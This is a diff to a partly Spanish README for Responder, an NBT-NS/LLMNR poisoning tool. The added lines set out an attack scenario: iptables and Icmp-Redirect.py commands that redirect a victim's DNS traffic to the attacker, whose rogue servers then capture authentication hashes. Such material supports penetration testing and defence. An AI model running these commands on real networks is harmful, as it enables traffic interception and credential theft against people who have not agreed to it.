@@ -14,6 +14,8 @@ NBT-NS poisoner will respond to broadcast NBT-NS queries.
 Cuando iniciamos responder, se unira al grupo IGMP y escuchara en el puerto UDP 5355 multicast.
 Ademas tambien se pondrá en escucha en los puertos TCP 139, 445, 1433, 80 and UDP port 137
 
+Extra Tools: responder/tools
+
 Usage:
 
 Several options are available, those are :
@@ -33,7 +35,15 @@ En caso de Hashes capturados, ver carpeta /responder/logs, por ej. HTTP-NTLMv2-1
 	  -r Seteado a 1 'responder' reponderá a las NBT-NS Workstation/Redirect queries
 	  -b HTTP authentication
 
-
+Scenario: 
+Attacker 192.168.2.10 DNS-Server 192.168.3.58 Victim 192.168.2.39 GW 192.168.2.1
+Desactivamos los ICMP requests salientes:
+#iptables -A OUTPUT -p ICMP -j DROP
+#Icmp-Redirect.py -i 192.168.2.10 -g 192.168.2.1 -t 192.168.2.39 -r 192.168.3.58
+Ahora debería haber cambiado la ruta de la victima hacia el servidor DNS, deberíamos ser nosotros su nuevo RogueServerDNS
+Ahora podemos crear una regla de Firewall con iptables para responder todos las consultas DNS por parte de la victima 192.168.2.39 hacia 192.168.3.58
+#iptables -t nat-A PREROUTING -p udp --dst 192.168.3.58 --dport 53 -j DNAT--to-destination 192.168.2.10:53
+Fromthere, Responder will reply to DNS requests and make use of its rogueauthentication servers.
 
 	       
 REF:
